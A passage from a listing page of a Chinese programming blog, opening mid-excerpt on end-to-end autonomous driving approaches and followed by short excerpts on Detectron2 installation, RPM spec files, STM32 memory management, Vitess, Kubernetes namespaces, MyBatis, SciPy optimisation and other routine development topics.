端到端系统（End-to-end systems），指的是直接从感知输入产生输出，常见的端到端系统有三种主要方法：直接监督的深度学习（ Direct supervised deep learning）4、神经进化（Neuroevolution）5和深度强化学习（Deep reinforcement learning）6。一般端到端系统的流程图如下图所示
最早的端到端系统可以追溯到ALVINN4，他训练了一个三层全连接的网络来输出车辆的前进方向。文7提出了一种输入图像输出转向的深度卷积神经网络。8提出了一种时空网络结构，即FCN-LSTM，可以预测车辆的运动。9介绍了另一种卷积模型DeepDriving，可以从输入图像中学习一组离散的感知指标。实际上这种方法并不是严格端到端的，因为如何从一系列感知指标中得到正确的驾驶动作还需要另外的模块。上述的方法都是有监督的训练，也就是说需要一个专家的行为序列。那么就引入了另一个问题，自动驾驶系统是否应该像人一样开车？
基于上面那个问题，出现了一种新的深度强化学习模型Deep Q Networks（DQN），将强化学习与深度学习相结合。强化学习的目标是选择一组能最大化奖励的行动，深度卷积神经网络在这里的作用是用来逼近最优奖励函数。简单来说，基于DQN的系统不再是去模仿专家的行为，而是去学习一种“最佳”的驾驶方式6
最后一种神经进化是指利用进化算法来训练人工神经网络，但就实际而言，经进化的端到端驾驶不像DQN和直接监督学习那样受欢迎。神经网络的出发点是去除了反向传播，从逻辑上来说，更接近生物的神经网络。在[63]中，作者使用驾驶模拟器对RNN进行神经进化训练。
上述三种端到端自动驾驶的方法相比，直接监督学习的方法可以利用标记数据离线训练，而DQN和神经进化都需要在线交互。从理论上讲，端到端自动驾驶是可行的，但是还没有在真实的城市场景中实现（demo不算），最大的缺点是缺乏可解释性和硬编码安全措施（Hard coded safety measures）。
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/dae1893c000e500a2774e101d3f6e51a/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/0598d0dfa6a005f1dd2866baaa207c2b/" rel="bookmark">
			Detectron2安装、使用与问题记录
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		Detectron2安装、使用与问题记录 detectron2是Facebook近期开源的框架，可以在Github上搜查到，本文总结了自己安装框架过程，以及自己碰到的一些问题和解决办法。
目录 Detectron2安装、使用与问题记录安装demo问题汇总 安装 环境构建：请尤其注意版本问题！！！ Python &gt;= 3.6
如conda create -n abc pyhon=3.6.8
PyTorch 1.3与torchvision
conda install pytorch=1.3 torchvision cudatoolkit=10.0 -c pytorch
（请选择匹配的cudatoolkit版本，以便成功安装框架）
OpenCV
Cython
fvcore
pip install 'git+https://github.com/facebookresearch/fvcore'
GCC &gt;= 4.9
查看gcc版本
gcc -v
pycocotools
pip install git+https://github.com/cocodataset/cocoapi.git#subdirectory=PythonAPI 或
git clone https://github.com/cocodataset/cocoapi.git cd ./cocoapi/PythonAPI python setup.py build_ext install 安装detectron2 git clone https://github.com/facebookresearch/detectron2.git cd detectron2 python setup.py build develop #或 pip install -e . 运行后需要耐心等待一会，没有任何报错提示成功安装，就大功告成了
demo 自行从网络上下载一张图片，比如下图，将其放在 /detectron2/ 目录下，同时创建一个result文件夹：
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/0598d0dfa6a005f1dd2866baaa207c2b/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/23aedb5f787198b318f7fb8ab3c14dee/" rel="bookmark">
			Caused by: java.lang.StackOverflowError: null 的解决办法
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		灵感源于这个：https://blog.csdn.net/Hello_World_QWP/article/details/81353365?utm_source=blogxgwz3
原因是我在给前端做接口的时候，springboot+jpa，返回json对象，对象里面比较复杂，还掺杂了一个manytoone，导致了异常出现。改掉就解决了！
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/bab498c087477bba411a47c2f3993f29/" rel="bookmark">
			RPM包制作：spec文件介绍
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		参考链接：
https://rpmbuildtut.wordpress.com/
https://rpm-packaging-guide.github.io/#packaging-software
https://rpm-packaging-guide.github.io/
http://rpm.org/index.html
spec文件参数介绍 spec文件可以理解为安装软件包时的配置文件，配合rpmbuild命令使用。
运行rpmbuild命令时，通过读取spec文件，按照spec中配置的参数，来安装软件包。
想写出spec文件，需要了解spec文件中各个参数的具体含义。spec文件参数说明如下。
Name: 软件包名称 Version:软件包主版本号 Release:软件包次版本号	Summary:摘要是对软件包的简短描述。 License: 授权协议，通用的是GPL。 URL: 在url下放置包的主页。 Source0: 源目录中tar源码包的名称。可以有很多个源码。 BuildRequires:列出创建包所需包的列表。 Requires:创建包所需依赖。 %description：描述不应与摘要相同。描述要更具体一些，但是不应太长。并且不要在描述句尾加句号。 %prep：表示预操作字段。在install之前执行（准备源码，唯一的操作是%setup -q） %setup -q ：表示构建BUILD环境，会解压压缩包到BUILD目录下。 %preun	:在uninstall之前执行 %post :在install 之后执行 %postun:在uninstall之后执行 %build ：表示通过直接调用源码目录中自动构建工具（比如说，configure文件）完成源码编译操作。 %configure: make：表示在源码目录中执行make命令。 %install ：安装字段。 %files：文件说明字段。告诉make install指令，需要安装那些文件。 %defattr(-,root,root,-) ：设置默认权限 %doc：标记所有的文本文件。 %doc docs/LICENSE：安装许可证。 %doc docs/README：安装README。 %changelog：更新日志。有固定格式(填错会报错)。比如说： *Sun Jul 13 2008 &lt;bjlongo@ncsu.edu&gt; 1 --Initial Build. --Added setup.py file. --Fixed bin/vpd, src/vpd.py. Copyright:软件包版权规则，GPL（自由软件），BSD，MIT， Public Domain（公共域）， Distributable（贡献）， commercial（商业），Share（共享）等。 Group:用于对包进行分类。可以查看/usr/share/doc/GROUPS文件中所有组的完整列表。 Buildroot:构建和安装包的位置 rpmbuild 命令的使用规则 首先使用命令：sudo yum -y install rpm-build安装rpmbuild。
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/bab498c087477bba411a47c2f3993f29/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/154b460dd525aa0f991df7ab5fe8c9b9/" rel="bookmark">
			【架构】工程代码结构(附带NXP、ST官方demo)
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		文章目录 1. 起因2. Demo结构解析2.1 ST公司的STM32Cube2.2 NXP公司的S32DS2.3 自己写的应用层 3. 实践 1. 起因 最近在做我们应用层内部代码从2.0到3.0版本的迁移，除了删减增加模块，规范写法，最主要的就是重新规划了代码的结构。我们代码的特点就是并行了很多项目，这些项目有共同的地方，又有区别。把哪些部分抽出来做共有库，哪些做自己的项目内部，makefile怎么构思(关于makefile我也会写一篇快速入门）。
有时候回头看看自己的代码，怎么可以写的这么乱，模块化一点都不好，接口乱七八糟。最近重构代码的冲动越来越强烈。
这么想想，小工程就算了，大一点的项目，还是应该提前把结构和接口设计好，代码怎么分层，功能怎么划分，再开始写。
不过很多工程，前期设计好了，也经不住需求的一再变更，改改改改，就变成了一坨忍不住想重写的翔……
算了不抱怨了，还是看看别人是怎么分层的。
2. Demo结构解析 这里列的几个例子不是linux应用层的，是单片机的demo。
2.1 ST公司的STM32Cube Cube版本：
简单来说，布局如下：
工程名
Document：文档Driver：硬件驱动 Bsp：板级的接口，比如串口、IO、定时器……CMSIS：内核接口，这个一般是内核厂家提供，代码不用改，STM32F7xx_HAL_Driver：ST厂家提供的HAL库，与以前提供的3.5的标准外设库属于同级，都是对寄存器配置的封装。HAL库是一个硬件抽象层，便于不同芯片之间的移植。（大家底层不一样，但是HAL库的接口都一样） Middleware：中间件包含的是一些位于系统代码和应用代码之间的，这里感觉就是在HAL库和用户调用之间又封装了一层，把一些协议栈封装进来了。 ST：ST自己的一些协议栈 STemWin：ST自己的界面STM32_Audio：音频驱动STM32_USB_Device_Library：封装了USB协议STM32_USB_Host_Library Third_Party：第三方库（协议栈） Fatfs：文件系统FreeRTOS：操作系统LwIP：IP协议栈…… Project：不同的项目，我理解应用层的代码都写在这里面，就是流程，对BSP的调用，对middleware的调用Utilities ：这一块不太懂，是公共库？公共资源？字库图库这些？xxxx.ioc ： 图形化配置文件，可以用CubeMx打开 2.2 NXP公司的S32DS S32DS版本：S32 Design Studio for Power Architecture Version: 2.1
NXP家的S32DS架构如下：
工程
Include：我理解是 应用层的头文件Generated Code：这个是根据图形化配置，系统自动生成的代码（配置数组），实际使用的使用，把这些配置数组加载到系统接口上就能实现对外设的配置。Project_Settings： Debugger：调试器配置Linker_File：链接.ld文件startup_code：启动代码，这个应该是厂家提供，不用改的 SDK plantform devices：设备driver：类似bsp，对寄存器操作的封装pal：NXP基于driver层上又封装了一层PAL层，把不同芯片的接口统一了。类似ST的HAL库，都是便于移植用的。 rtos FreeRTOS_PA:没啥说的，就是移植的freetososif： NXP自己的一个裸核的系统。bareMetal。 Source：我理解是应用层的代码Documentxxx.pe：图形化配置界面。xxx.ld：链接文件 2.3 自己写的应用层 这是我目前在整理的结构，个人感觉还挺好的，毕竟已经是做的第2次重构了，比较贴合我们的真实需求。
因为保密考虑，只列了一部分简单结构，能体现出来结构优势即可。
api：一些公有库的头文件 BaseApi lib BaseLib：包含一些硬件模块的驱动 Can：Can的驱动接口Gpio：Gpio的驱动接口NetSend：网络驱动接口I2C：I2C的驱动接口Uart：串口的驱动接口… Isp：摄像头芯片的图像调整Common：读写文件、读写DDR、时间获取Xcore：cache映射…… project：以上都属于共有库的部分，适合于一些项目来做开发，在project目录下，做不同项目的区别，流程、交互、协议等。 zu3_foresight main main.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/154b460dd525aa0f991df7ab5fe8c9b9/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/53ebfc030c77dc3fd519019bf8ef4864/" rel="bookmark">
			DRF(Django-Rest-FrameWork)非主外键自关联
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		群:1051907485 这是一个菜单管理列表的小demo model.py class SysPermission(models.Model): id = models.CharField(db_column='Id', primary_key=True, max_length=50) # Field name made lowercase. parentid = models.CharField(db_column='ParentId', max_length=50, blank=True, null=True) # Field name made lowercase. layer = models.IntegerField(db_column='Layer', blank=True, null=True) # Field name made lowercase. encode = models.CharField(db_column='EnCode', max_length=50, blank=True, null=True) # Field name made lowercase. name = models.CharField(db_column='Name', max_length=50, blank=True, null=True) # Field name made lowercase. jsevent = models.CharField(db_column='JsEvent', max_length=50, blank=True, null=True) # Field name made lowercase. icon = models.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/53ebfc030c77dc3fd519019bf8ef4864/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/c42e6a2fdc6706349c709840376cf9b8/" rel="bookmark">
			Vue使用print.js连续打印多页A4表单
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		父组件 &lt;el-dialog :visible.sync="printDialog" class="printDialog"&gt; &lt;div ref="print"&gt; &lt;section class="print-page page-a4"&gt; &lt;acceptance-form :reg-id="printTableRegId" @child-event="parentEvent" /&gt; &lt;div class="print-bottom hidden-print noPrint" /&gt; &lt;/section&gt; &lt;section v-for="(item,key) in forEachNum" v-show="printNextPage" :key="key" class="print-page page-a4"&gt; &lt;!-- page-size: 每页显示档号条数 --&gt; &lt;acceptance-form-copy :reg-id="printTableRegId" :test-new-data="testNewData" :page-count="pageCount" :page-index="item" :page-size="20" @grandson-event="sonEvent" /&gt; &lt;div class="print-bottom hidden-print noPrint" /&gt; &lt;/section&gt; &lt;/div&gt; &lt;div style="margin-top: 1px; margin-left: 16px" class="noPrint"&gt; &lt;el-button type="primary" size="medium" class="el-icon-upload" @click="getPdf()"&gt;&amp;nbsp;&amp;nbsp;保存&lt;/el-button&gt; &lt;el-button type="primary" size="medium" class="el-icon-printer" @click="print"&gt;&amp;nbsp;&amp;nbsp;打印&lt;/el-button&gt; &lt;/div&gt; &lt;/el-dialog&gt; methods: { parentEvent(type, forEachNum, newArr, count, pageSize) { this.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/c42e6a2fdc6706349c709840376cf9b8/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/3a682fc83eaa7de016c54f4bd73c48f4/" rel="bookmark">
			使用邻接矩阵实现商品SKU表单联动
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		什么是邻接矩阵 不了解邻接矩阵，请查看邻接矩阵
邻接矩阵是一个用来描绘顶点与边关系的数据结构。它的本质是一个二维数组，适合用来处理最小数据单元之间的关联关系。邻接矩阵有两种模式：无向图以及有向图。无向图主要的特点是不表示方向点与点之间可以双向流通，有向图则包含方向两点间可单向亦可双向。他们主要应用在迷宫、简单地图、级联表单等等图形化场景
先看看我们要实现效果 交互分析 当用户选择青芒色的规格时，所有青芒色相关的可选项均亮起同规格可选项也为亮起状态，例如，选择青芒色时，所有颜色选项为亮起可选状态当用户选择图案类型时，在颜色以及图案的公共作用下，部分规格亮起最后用户选择尺码类型时，在颜色、图案以及尺码的公共作用下，产品规格确定更新规格选择无顺序要求 如果让后端下发一个递归的树结构1：会产生非常多的数据囤余。2：导致传输的数据量级变大。3：计算放在服务器加大服务器开销。
实现思路 1、获取后端数据 这里以七月老师提供的商品数据为例，由于数据太长，我们只列出部分数据。
const product = { "id":2, .... "sku_list":[ { "id":2, "price":77.76, "discount_price":null, "title":"金属灰·七龙珠", .... "specs":[ { "key_id":1, "key":"颜色", "value_id":45, "value":"金属灰" }, { "key_id":3, "key":"图案", "value_id":9, "value":"七龙珠" }, { "key_id":4, "key":"尺码", "value_id":14, "value":"小号 S" } ], "code":"2$1-45#3-9#4-14", "stock":5 }, .... ], "spu_img_list":[ { "id":165, .... } ], "spu_detail_img_list":[ { "id":24, .... } ], "sketch_spec_id":1, "default_sku_id":2 } 观察效果图，我们还需要一个规格属性列表，数据结构如下：
[{ key_id: 1, key: "
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/3a682fc83eaa7de016c54f4bd73c48f4/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/b5edc94ef64ab65a9d73a0a3be2b2ced/" rel="bookmark">
			stm32 单片机的__attribute__ ((at())绝对定位及首次适应算法的动态内存管理
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		本段代码可单独作为一个模块放心使用。 单片机中 __attribute__( at(绝对地址) )的作用分两个，一个是绝对定位到Flash，另个一是绝对定位到RAM/SDRAM。 1、定位到flash中，一般用于固化的信息，如ID卡的ID号，flash标记等等 2、定位到RAM/SDRAM中，一般用于数据量比较大的缓存，如动态内存分配的缓存，串口的接收缓存. 由于单片机的内存空间不够大，硬件设计会外加一个SDRAM等用来扩展存储空间。 这里为了方便动态内存管理所需要的较大缓存空间，就采用__attribute__( at(绝对地址) )定位到SDRAM，
#define MEM_BASE 0xD0700000
mem_TypeDef memory_pool __attribute__((at(MEM_BASE)));
//动态内存分配使用首次适应算法
/* Exported types ------------------------------------------------------------*/ #define SIZE_OF_PAGE 1024 #define MAX_PAGE_NUMBER 1024
#define MSHIFT_BIT 10
//内存表的结构体
typedef struct
{
uint32_t mallocBase; /* Memory pool base address */
uint16_t size[MAX_PAGE_NUMBER]; /* Sizes Table to allow safe deallocation */
uint8_t PageTable[MAX_PAGE_NUMBER]; /* Memory page state table '1'-&gt; Allocated '0' -&gt; Free */
}
mem_TypeDef;
//初始化内存表
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/b5edc94ef64ab65a9d73a0a3be2b2ced/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/d7327bbf16b98a3e3b00398b454f18f2/" rel="bookmark">
			京东如何基于Vitess管理大型MySQL实例集群
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		本文根据dbaplus社群第203期线上分享整理而成
讲师介绍
王云博
京东数据库高级研发工程师
2014年加入京东，一直致力于数据库运维自动化的发展；
2018年专注于京东弹性数据库研发、运维工作。
谢金科
2017年加入京东，致力于弹性库落地、周边生态开发及建设工作。
一、初识Vitess
MySQL作为关系型数据库的佼佼者，伴随着互联网技术的发展，已风靡全球十余年；但是MySQL单机存储能力有限。性能或者容量达到瓶颈后，就需要我们来进行改造。
当MySQL出现性能和存储瓶颈后，目前有2个大的解决方向。一个是利用程序或者数据库中间件（底层仍是MySQL）来实现分库分表,。这种中间件方案，我相信每个DBA或者相关研发人员，或多或少的都了解过或测试过。
另一个方向，就是使用分布式数据库直接解决，比如业内比较火的tidb，cockroachdb等。对于后者，我想没有人去否定它，它一定是关系型数据库的将来；因此一些大公司纷纷都在招募人马，积极发展自己的分布式关系型数据库，但是目前此类数据库还有一些问题亟待解决，因此传统的分库分表中间件还是有它成长和发展空间的。
我今天将向大家介绍一个集部署、扩展、管理大型MySQL实例集群的数据库解决方案：Vitess。
Vitess最初的名字是Voltron， Voltron是动画片里的人物形象，可以把多个部件汇总在一起组成超级机器人（隐喻Vitess是分布式系统），选择开源对外发布的时候，合伙人给这个产品起名为vitesse，法语中“速度”的意思，但这哥们由于拼写经常糊里糊涂的，漏写了一个e，后来也就这样了。(玩笑)
Vitess的里程碑：
2010年出生，2011年上线应用
2012年开源，2015年为云而生
2018年2月加入CNCF
2019年10月从CNCF毕业
CNCF有三个不同层次的项目：沙箱、孵化和毕业。目前只有8个项目毕业，这意味着它们符合最高水平的质量标准。有了CNCF的毕业认证背书，说明Vitess是质量可靠、社区完善、创新新颖的数据库中间件软件。
下面是一些客观数据，也说明Vitess是非常被业界认可的。
Github：9,000+ stars、17,000+ commits、190+ contributors、1200+ forks、1000+ Slack members
谁在使用：Youtube、Slack、Square、Pinterest、Github、BetterCloud等
使用环境：k8s/non k8s, AWS / GKE / EKS / Azure
1、Vitess主要特性
1）扩展性
Vitess集MySQL数据库的很多重要特性和NoSQL数据库的可扩展性于一体。
其内建拆分分片功能使用户的MySQL数据库集群可以实现无限水平扩展，同时无需为应用添加分片逻辑。
2）性能
Vitess避免了MySQL连接的高内存开销。Vitess服务器轻松地一次处理数千个连接。
Vitess自动重写对数据库性能有损害的查询。它还使用缓存机制来调解查询，并防止重复查询同时到达后端的数据库。
3）运维
Vitess可以支持自动处理主故障转移和备份等功能。
它使用分布式元数据服务来跟踪和管理服务器，使您的应用程序无需关心数据库拓扑变化。
4）Cloud-native
容器化（Containerized）：每个部分（应用程序，进程等）都封装在自己的容器中。这有助于重复性，透明度和资源隔离。
动态编排（Dynamically orchestrated）：动态的调度和管理容器以优化资源利用。
面向微服务（Microservices oriented）：应用程序基于微服务架构，显著提高架构演进的灵活性和可维护性。
2、Vitess架构
其中各个角色用途如下：
1）Vttablets部署在某个单独的MySQL实例之前，接管所有与该MySQL实例的通信和维护主、从架构。
2）Vitess需要一个拓扑服务器来存储其元数据。可以是etcd、zk、consul等。
3）Vtgate是无状态的proxy，可以动态的扩容。（由于proxy是带数据库连接状态的，缩容是需要注意的）
4）应用服务器可以连接到任何vtgate，甚至在请求之间。
5）vtctld是用于查看系统元数据，启动工作流，具备相关维护操作的web服务。
前面我们提到，Vitess为云而生，Vitess是如何做到的？
Vitess出生于youtube，part of google，vitess早于k8s，但已为k8s准备就绪，因为它在google内部服务于borg系统，而k8s的前身正是borg。云中的数据库是k8的最后一个领域，而Vites填补了这一空白。目前大规模使用k8s部署生产集群的公司有，JD 、Needlework Lab，Hub 。
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/d7327bbf16b98a3e3b00398b454f18f2/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/3bfd757a2decf7788a22c2b345be711f/" rel="bookmark">
			Unity 工具类 之 BlendShape 捏脸的实现
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		Unity 工具类 之 BlendShape 捏脸的实现 目录
Unity 工具类 之 BlendShape 捏脸的实现
一、简单介绍
二、实现原理
三、注意事项
四、效果预览
五、实现步骤
六、代码
七、参考工程
一、简单介绍 Blender 是一款开源的跨平台全能三维动画制作软件，提供从建模、动画、材质、渲染、到音频处理、视频剪辑等一系列动画短片制作解决方案。
在Unity程序开发中，使用 Blender 制作的模型，进行 BlendShap 捏脸的实现；
二、实现原理 1、通过控制改变 Skinned Mesh Renderer 的 BlendShapes 下的参数数值，来实现捏脸的效果
三、注意事项 1、Blender 中编辑模式下设置的值是实现好的捏脸效果的关键；
四、效果预览 五、实现步骤 1、打开Unity，新建一个工程，并且导入模型，添加到场景中，如下图
2、在场景中，添加几个Slider UI 组件，控制捏脸的数值，如下图
3、编写脚本，控制BlendShapes 对应数值的变化，把对应脚本挂载到对应组件上，如下图
4、运行场景，效果如下
六、代码 1、Singleton
using System.Collections; using System.Collections.Generic; using UnityEngine; public class Singleton&lt;T&gt; : MonoBehaviour where T:MonoBehaviour { private static T m_Instance; public static T Instance { get { return m_Instance; } } protected virtual void Awake() { m_Instance = this as T; } } 2、BlendShape
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/3bfd757a2decf7788a22c2b345be711f/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/c517a5552042225867f98d8c65c472ee/" rel="bookmark">
			Java学习笔记（十）：函数式接口
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		foochane ：https://foochane.cn/article/2020010402.html
文章目录 1 函数式接口1.1 概念1.2 格式1.3 @FunctionalInterface注解1.4 自定义函数式接口 2 函数式编程2.1 Lambda的延迟执行性能浪费的日志案例体验Lambda的更优写法证明Lambda的延迟 2.2 使用Lambda作为参数和返回值 3 常用函数式接口3.1 Supplier接口3.2 练习：求数组元素最大值题目解答 3.3 Consumer接口抽象方法：accept默认方法：andThen 3.4 练习：格式化打印信息题目解答 3.5 Predicate接口抽象方法：test默认方法：and默认方法：or默认方法：negate 3.6 练习：集合信息筛选题目解答 3.7 Function接口抽象方法：apply默认方法：andThen 3.8 练习：自定义函数模型拼接题目解答 1 函数式接口 1.1 概念 函数式接口在Java中是指：有且仅有一个抽象方法的接口。
函数式接口，即适用于函数式编程场景的接口。而Java中的函数式编程体现就是Lambda，所以函数式接口就是可以适用于Lambda使用的接口。只有确保接口中有且仅有一个抽象方法，Java中的Lambda才能顺利地进行推导。
备注：“语法糖”是指使用更加方便，但是原理不变的代码语法。例如在遍历集合时使用的for-each语法，其实底层的实现原理仍然是迭代器，这便是“语法糖”。从应用层面来讲，Java中的Lambda可以被当做是匿名内部类的“语法糖”，但是二者在原理上是不同的。
1.2 格式 只要确保接口中有且仅有一个抽象方法即可：
修饰符 interface 接口名称 { public abstract 返回值类型 方法名称(可选参数信息); // 其他非抽象方法内容 } 由于接口当中抽象方法的 public abstract 是可以省略的，所以定义一个函数式接口很简单：
public interface MyFunctionalInterface { void myMethod(); } 1.3 @FunctionalInterface注解 与 @Override 注解的作用类似，Java 8中专门为函数式接口引入了一个新的注解： @FunctionalInterface 。该注解可用于一个接口的定义上：
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/c517a5552042225867f98d8c65c472ee/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/46df49ecbea47c2105ac3b90ac34e5c0/" rel="bookmark">
			Kubernetes中Namespace与Pod
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		一、Namespace 1）Namespace概述 Namespace是对一组资源和对象的抽象集合，比如可以用来将系统内部的对象划分为不同的项目组或用户组。常见的pods, services, replication controllers和deployments等都是属于某一个namespace的（默认是default），而node, persistentVolumes等则不属于任何namespace。
Namespace常用来隔离不同的用户，比如Kubernetes自带的服务一般运行在kube-system namespace中。
Kubernetes中的名称空间与docker中的名称空间不同。K8s中的名称空间只是做了一个逻辑上的隔离。
2）Namespace常用的命令 （1）查询 [root@master ~]# kubectl get namespaces //查看K8s中存在的名称空间 NAME STATUS AGE default Active 6d21h kube-node-lease Active 6d21h kube-public Active 6d21h kube-system Active 6d21h //namespace包含两种状态”Active”和”Terminating”。在namespace删除过程中，namespace状态被设置成”Terminating”。 [root@master ~]# kubectl describe namespaces default //查看default名称空间的详细信息 [root@master ~]# kubectl get pod --namespace=default [root@master ~]# kubectl get pod -n default //查看default名称空间中的pod资源（两者都可以） [root@master ~]# kubectl get pod //如果不指定，则默认也是查看default名称空间中的资源 （2）创建、删除 使用命令行创建
[root@master ~]# kubectl create namespace beijing //创建一个名称空间，名称为beijing //创建完成后，可以通过“kubectl get namespaces”命令查看到 [root@master ~]# kubectl delete namespace beijing //删除新创建的名称空间 使用yaml文件创建
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/46df49ecbea47c2105ac3b90ac34e5c0/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/7ca0ac0cf96572c11546fd620b1f803c/" rel="bookmark">
			【python 3.6】ERROR: No matching distribution found for python-opencv
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		python 3.6安装python-opencv出错：
改用命令 python -m pip install python-opencv即可。
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/41ea61cc82261eb81fdec4fc84245f26/" rel="bookmark">
			MyBatis方法参数详解
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		MyBatis方法参数详解 1. 单参数方法 单参数方法的参数详解, 主要介绍不同类型的参数,在Mapper映射文件中的配置方式.
参数为: 简单类型(基本数据类型+String)参数为: 对象类型参数为: List集合类型-List参数为: List集合类型-List参数为: 数组类型参数为: Set集合类型参数为: Map集合类型 1.1 简单类型 1.1.1 方法示例 public User findUserById(int id); 1.1.2 映射配置 &lt;!-- public User findUserById(int id); --&gt; &lt;select id="findUserById" resultType="com.itheima.domain.User"&gt; select * from user where id = #{id} &lt;/select&gt; &lt;!-- 如果只有一个参数,且参数是基本数据类型,则#{}中,可以随便写. 如: #{aaa}也可以 --&gt; 1.2 对象类型 1.2.1 方法示例 public List&lt;User&gt; findUserByUsernameAndPassword(User user); 1.2.2 映射配置 &lt;!-- public List&lt;User&gt; findUserByUsernameAndPassword(User user); --&gt; &lt;select id="findUserByUsernameAndPassword" resultType="com.itheima.domain.User"&gt; select * from user where username=#{username} and password=#{password} &lt;/select&gt; &lt;!
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/41ea61cc82261eb81fdec4fc84245f26/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/e9fba6382ab31e316a62076455c2806e/" rel="bookmark">
			优化 | 利用SciPy求解非线性规划问题
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		作者：莫斑炜
编者按：本文使用SciPy的optimize模块来求解非线性规划问题，结合实际例子，引入非线性规划问题的求解算法及相应函数的调用。
本文提纲
一维搜索／单变量优化问题
无约束多元优化问题
非线性最小二乘问题
约束优化问题
非线性规划问题的目标函数或约束条件是非线性的。本文使用SciPy的optimize模块来求解非线性规划问题。
目标函数和约束条件是否连续光滑是非常重要的性质，这是因为如果光滑，则所有决策变量可微，多变量函数的偏导数组成的向量为梯度，梯度是指向目标函数增长最快的方向。将目标函数梯度作为搜索方向，对非线性规划问题的求解具有重要的意义。这些函数或其导数\梯度的不连续性给许多现有的非线性优化问题的求解带来了困难。在下文中，我们假设这些函数是连续且光滑的。
# Importing Modules from scipy import optimize import matplotlib.pyplot as plt import numpy as np import sympy 1、一维搜索／单变量优化问题（Univariate Optimization）
无约束非线性规划最简单的形式是一维搜索。一维搜索通常作为多维优化问题中的一部分出现，比如梯度下降法中每次最优迭代步长的估计。求解一维搜索常用的两类方法是函数逼近法和区间收缩法。其中函数逼近法是指用较简单的函数近似代替原来的函数，用近似函数的极小点来估计原函数的极小点，比如牛顿法；区间收缩法对于一个单谷函数通过迭代以不断缩小该区间的长度，当区间长度足够小时，可将该区间中的一点作为函数的极小点，比如黄金分割法。
e.g. 最小化一个单位体积的圆柱体的表面积。
Objective s.t. 目标函数为圆柱体的表面积，约束条件为圆柱体体积为1。变量为r、h，这是一个带等式约束的二维优化问题。根据等式约束条件，可得 ，代入目标函数得到一维搜索： 。该问题可通过求解导数为0的方法来求解。
r, h = sympy.symbols("r, h") Area = 2 * sympy.pi * r**2 + 2 * sympy.pi * r * h Volume = sympy.pi * r**2 * h h_r = sympy.solve(Volume - 1)[0] Area_r = Area.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/e9fba6382ab31e316a62076455c2806e/">Read more…</a>
	</div>
</article>
</main>

<div class="pagination">
	<a class="pagination__item pagination__item--prev btn" href="/posts/page/242/">«</a>
	<span class="pagination__item pagination__item--current">243/306</span>
	<a class="pagination__item pagination__item--next btn" href="/posts/page/244/">»</a>
</div>

			</div>
			

		</div>
		<footer class="footer">
	<div class="container footer__container flex">
		
		<div class="footer__copyright">
			&copy; 2024 编程爱好者博客.
